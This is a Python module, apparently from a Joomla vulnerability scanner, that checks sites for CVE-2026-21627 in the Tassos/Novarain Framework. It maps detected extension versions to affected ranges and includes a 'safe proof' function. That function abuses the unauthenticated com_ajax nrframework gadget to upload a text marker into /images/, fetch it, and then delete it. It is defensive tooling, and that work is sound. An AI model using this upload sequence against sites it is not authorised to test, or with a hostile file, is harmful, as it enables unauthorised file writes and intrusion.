from __future__ import annotations

import base64
import json
import re
import secrets
import urllib.parse
from typing import Any

from ...core.http import HttpClient, normalize_url
from ...core.models import Finding
from ...core.probes import find_anon_csrf_token
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-21627"
NAME = "Novarain/Tassos Framework improper access control"
COMPONENT = "Novarain/Tassos Framework (plg_system_nrframework)"
AFFECTED_RULE = "Tassos Framework 4.10.14-6.0.37 and affected bundled product releases"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]
AJAX_PATH = "/index.php"

PRODUCTS: dict[str, tuple[str, str | None, str | None]] = {
    "nrframework": ("Novarain/Tassos Framework", "4.10.14", "6.0.37"),
    "convertforms": ("Convert Forms", "3.2.12", "5.1.0"),
    "engagebox": ("EngageBox", "6.0.0", "7.1.0"),
    "google_structured_data": ("Google Structured Data", "5.1.7", "6.1.0"),
    "advanced_custom_fields": ("Advanced Custom Fields", "2.2.0", "3.1.0"),
    "smilepack": ("Smile Pack", "1.0.0", "2.1.0"),
    "mailchimp_auto_subscribe": ("MailChimp Auto-Subscribe", None, None),
}


def _classify(version: str | None, minimum: str | None, maximum: str | None) -> str:
    parsed = parse_version_safe(version)
    lower = parse_version_safe(minimum)
    upper = parse_version_safe(maximum)
    if parsed is None or lower is None or upper is None:
        return "INCONCLUSIVE"
    if parsed < lower:
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed <= upper else "PATCHED"


def _finding(status: str, confidence: str, detail: str, **kwargs: Any) -> Finding:
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=detail,
        action="Update plg_system_nrframework to 6.0.38 or newer and update every installed Tassos extension.",
        **kwargs,
    )


def _stored_filename(response: dict[str, Any]) -> tuple[str | None, str | None]:
    server_path = response.get("file") if isinstance(response.get("file"), str) else None
    if server_path:
        filename = server_path.replace("\\", "/").rsplit("/", 1)[-1]
        if re.fullmatch(r"[A-Za-z0-9._-]+", filename):
            return filename, server_path
    encoded = response.get("file_name")
    if isinstance(encoded, str):
        try:
            filename = base64.b64decode(encoded, validate=True).decode("utf-8")
        except (ValueError, UnicodeDecodeError):
            filename = encoded
        if re.fullmatch(r"[A-Za-z0-9._-]+", filename):
            return filename, server_path
    return None, server_path


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    client.request(f"{base}/", timeout=timeout)
    client.request(
        f"{base}{AJAX_PATH}?option=com_ajax&format=raw&plugin=nrframework",
        timeout=timeout,
    )
    token, _token_source = find_anon_csrf_token(
        base,
        timeout=timeout,
        proxy=proxy,
        requester=client.request,
    )
    if not token:
        return _finding(
            "NOT_CONFIRMED",
            "LOW",
            "The session was initialized, but no matching anonymous Joomla CSRF token was found.",
            exploit_ran=True,
        )

    nonce = secrets.token_hex(8)
    marker = f"ProofCMS CVE-2026-21627 safe proof {nonce}"
    original_name = f"proofcms-{nonce}.txt"
    params = {
        "option": "com_ajax",
        "format": "raw",
        "plugin": "nrframework",
        "task": "include",
        "path": "plugins/system/nrframework/fields/",
        "file": "nrinlinefileupload",
        "class": "JFormFieldNRInlineFileUpload",
        "upload_folder": base64.b64encode(b"images").decode(),
        token: "1",
    }
    upload_url = f"{base}{AJAX_PATH}?{urllib.parse.urlencode(params)}"
    upload = client.post_multipart(
        upload_url,
        fields={},
        files={"file": (original_name, marker.encode(), "text/plain")},
        timeout=timeout,
    )
    try:
        upload_json = json.loads(upload.get("body", ""))
    except (json.JSONDecodeError, TypeError):
        upload_json = {}
    if not isinstance(upload_json, dict) or upload_json.get("error") is not False:
        return _finding(
            "NOT_CONFIRMED",
            "MEDIUM",
            f"The safe text upload was not accepted (HTTP {upload.get('status', 0)}).",
            exploit_ran=True,
            proof_url=upload_url,
        )

    filename, server_path = _stored_filename(upload_json)
    if not filename:
        return _finding(
            "VULNERABLE_UPLOAD_ONLY",
            "HIGH",
            "The vulnerable gadget reported a successful text upload, but returned no safe public filename for verification.",
            exploit_ran=True,
            proof_url=upload_url,
        )

    proof_url = f"{base}/images/{urllib.parse.quote(filename)}"
    proof = client.request(proof_url, timeout=timeout)
    if proof.get("status") != 200 or marker not in proof.get("body", ""):
        return _finding(
            "VULNERABLE_UPLOAD_ONLY",
            "HIGH",
            "The gadget accepted the upload and disclosed its stored filename, but the public marker could not be verified.",
            exploit_ran=True,
            proof_url=proof_url,
            uploaded_filename=filename,
        )

    cleaned = False
    if server_path:
        cleanup_params = dict(params)
        cleanup_params.pop("upload_folder", None)
        cleanup_params.update({"action": "remove", "remove_file": server_path})
        cleanup_url = f"{base}{AJAX_PATH}?{urllib.parse.urlencode(cleanup_params)}"
        cleanup = client.request(cleanup_url, timeout=timeout)
        cleanup_check = client.request(proof_url, timeout=timeout)
        cleaned = cleanup.get("status") == 200 and (
            cleanup_check.get("status") in {403, 404, 410}
            or marker not in cleanup_check.get("body", "")
        )

    return _finding(
        "VULNERABLE",
        "CONFIRMED",
        (
            "A unique text marker was written through the unauthenticated nrframework gadget, fetched from /images/, "
            "and removed using only its returned path."
            if cleaned
            else "A unique text marker was written through the unauthenticated nrframework gadget and fetched from /images/, but cleanup could not be verified."
        ),
        exploit_ran=True,
        proof_url=proof_url,
        uploaded_filename=None if cleaned else filename,
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    detected: list[tuple[str, str | None, str]] = []
    for key, (label, minimum, maximum) in PRODUCTS.items():
        info = (plugins or {}).get(key, {})
        if info.get("found"):
            detected.append(
                (label, info.get("version"), _classify(info.get("version"), minimum, maximum))
            )

    if not detected:
        result = Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="MEDIUM",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="Neither the Tassos Framework nor a known bundling extension was detected.",
            action="Verify plg_system_nrframework manually if Tassos extensions use non-public paths.",
        )
        return result

    direct = next((item for item in detected if item[0] == "Novarain/Tassos Framework"), None)
    evidence = "; ".join(f"{label} {version or 'version unknown'}" for label, version, _ in detected)
    statuses = {status for _, _, status in detected}
    if direct and direct[2] == "LIKELY_VULNERABLE":
        status, confidence = "LIKELY_VULNERABLE", "HIGH"
        detail = f"Detected the affected framework directly. Evidence: {evidence}."
    elif direct and direct[2] == "PATCHED":
        status, confidence = "PATCHED", "HIGH"
        detail = f"The directly detected framework version is outside the affected range. Evidence: {evidence}."
    elif direct and direct[2] == "NOT_AFFECTED":
        status, confidence = "NOT_AFFECTED", "HIGH"
        detail = f"The directly detected framework version predates the published affected range. Evidence: {evidence}."
    elif "LIKELY_VULNERABLE" in statuses:
        status, confidence = "LIKELY_VULNERABLE", "HIGH"
        detail = f"Detected a product release listed as affected because it bundles the framework. Evidence: {evidence}."
    elif statuses == {"PATCHED"}:
        status, confidence = "PATCHED", "HIGH"
        detail = f"All detected product versions are outside their published affected ranges. Evidence: {evidence}."
    elif statuses == {"NOT_AFFECTED"}:
        status, confidence = "NOT_AFFECTED", "HIGH"
        detail = f"All detected product versions predate their published affected ranges. Evidence: {evidence}."
    else:
        status, confidence = "INCONCLUSIVE", "MEDIUM"
        detail = f"A framework-bundling product was detected, but affected status could not be resolved. Evidence: {evidence}."

    component_version = direct[1] if direct else None
    result = Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence=confidence,
        component=COMPONENT,
        component_version=component_version,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=detail,
        action="Update plg_system_nrframework to 6.0.38 or newer and update every installed Tassos extension.",
    )
    if not run_exploit_check:
        return result
    if exploit_mode != "safe":
        result.detail += " This module supports only the self-cleaning text-file proof."
        return result
    if not (plugins or {}).get("nrframework", {}).get("found"):
        result.detail += " Safe proof skipped because the framework itself was not detected."
        return result
    proof = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    proof.component_version = (plugins or {}).get("nrframework", {}).get("version")
    return proof


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["*"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-09-29",
        "updated": "2026-09-29",
        "required_detectors": list(PRODUCTS),
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-21627",
            "https://www.tassos.gr/",
        ],
    }
